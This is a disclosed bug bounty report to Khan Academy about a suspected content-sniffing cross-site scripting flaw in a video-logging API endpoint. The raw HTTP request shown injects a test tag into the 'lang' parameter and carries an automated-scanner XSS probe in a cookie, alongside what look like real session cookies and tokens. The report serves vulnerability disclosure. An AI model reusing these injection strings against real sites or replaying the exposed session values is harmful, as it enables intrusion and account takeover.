# Cross site scripting (content-sniffing)

## Report Details
- **Report ID**: 438953
- **URL**: https://hackerone.com/reports/438953
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-11-10T21:47:07.651Z
- **Disclosed**: 2018-12-08T00:44:54.196Z

## Reporter
- **Username**: sarmadkhan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: khanacademy

## Vulnerability Information
Your website may be vulnerable to cross site scripting attacks

HTTP request:
GET /api/internal/_mt/user/videos/VIVIegSt81k/log_compatability?captions_locale=&casing=camel&client_dt=2018-11-11T01:56:55%2B05:00&fallback_player=1&ga_referrer=&lang=en<WHX9HM>KUHGM[!%2b!]</WHX9HM>&last_second_watched=0&pstate=1b_-1--1_1_0_0;2b_-1--1_1_0_0;3_-1-1_1_-1_0_0;&seconds_watched=0&_=1541883415937 HTTP/1.1
Referer: https://www.khanacademy.org/
Cookie: fkey=1.0_pEwSOQECgpFQnw==_1541883878; gae_b_id=; ka_session=b3J0F_xS8J97gKpoOxtWuf1f2zRsV0VSy7VUdpZH:1541883942:1541884130:1:; _gcl_au=1.1.623292152.1541883394; KAID=YWc1emZtdG9ZVzR0WVdOaFpHVnRlWElyQ3hJSVZYTmxja1JoZEdFaUhXdGhhV1JmTlRNeE5UZzBNall3TURVd01qZ3dOelV5TXpBeU1UUTBEQQoyMDE4MzE0MjEwNDM4LjM1ODc2NwowCgozNGUyODY2NzRiMDg2YjJlODg4MmU0MGMzNWQ0YzZiZGE5MjNmNjQxMDA5ZmU3N2Q4NTQ5MjIwZTdhNGYxZmNl; ki_t=1541883407036%3B1541883407036%3B1541883888321%3B1%3B9; ki_r=http%3A%2F%2Fwww.acunetix-referrer.com%2Fjavascript%3AdomxssExecutionSink(0%2C%22'%5C%22%3E%3Cxsstag%3E()refdxss%22); ki_s=131508%3A0.0.0.0.0%3B154853%3A0.0.0.0.0; useFallbackPlayer=1; KAID_PH=YWc1emZtdG9ZVzR0WVdOaFpHVnRlWElyQ3hJSVZYTmxja1JoZEdFaUhXdGhhV1JmTlRNeE5UZzBNall3TURVd01qZ3dOelV5TXpBeU1UUTBEQQoyMDE4MzE0MjA1NjU2LjU2NjA5CjAKCjQ1NzhjOTEyYmNhNDgwNDk1NzljMTNjMmYxYjU2NDM2YjIzMTBiMzkyZjZkODBjNzdmYjlkOWFlMmJjYzc2ZTI=; LIS=es,en; BizoID=92aa3edd-c454-4fbe-a10a-d2e3da70a6b7; lang=v=2&lang=en-us; lidc="b=SGST05:g=8:u=1:i=1541883450:t=1541969850:s=AQGK30fWxynJjV3aKyQbLaewIhKVtmEF"; UserMatchHistory=AQKZ8VKa9hggAQAAAWb_alQG0mseUCutYAJQQMZVWtlj-CNMZMwIs0rvBTIy4GwYqzmMHIdYTVo; bcookie="v=2&19f6e6cd-63b3-4fbf-8a7c-69515f373799"; bscookie="v=1&20181110205732ab3b1160-2440-4838-87a2-85dfb09161c5AQHfmegG3VBLxpJV8KnGUsa6PwygpigK"; 1P_JAR=2018-11-10-21; NID=146=j8ucCJsO9VUtiEokZ3og0Txgo75kVnjxpVsUEGlEPlWcS2d8FcfQPSoxjHhGztQLUEI8zQgVyTr3PyoY90Wc3qpqGJS6MC9jqMhNqFtvBxY9ROZQiUOC-a2C6LIcyjmWaPmCbbI7yoklfZw4D4wYAXx-8bMSQOkYAOeGJDe71DA; growth_teacher_content_upsell_dismissed=1; LIS=es,en
Host: www.khanacademy.org
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

## Impact

Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them. An attacker can steal the session cookie and take over the account, impersonating the user. It is also possible to modify the content of the page presented to the user.

## Attachments
- khan-academy.png
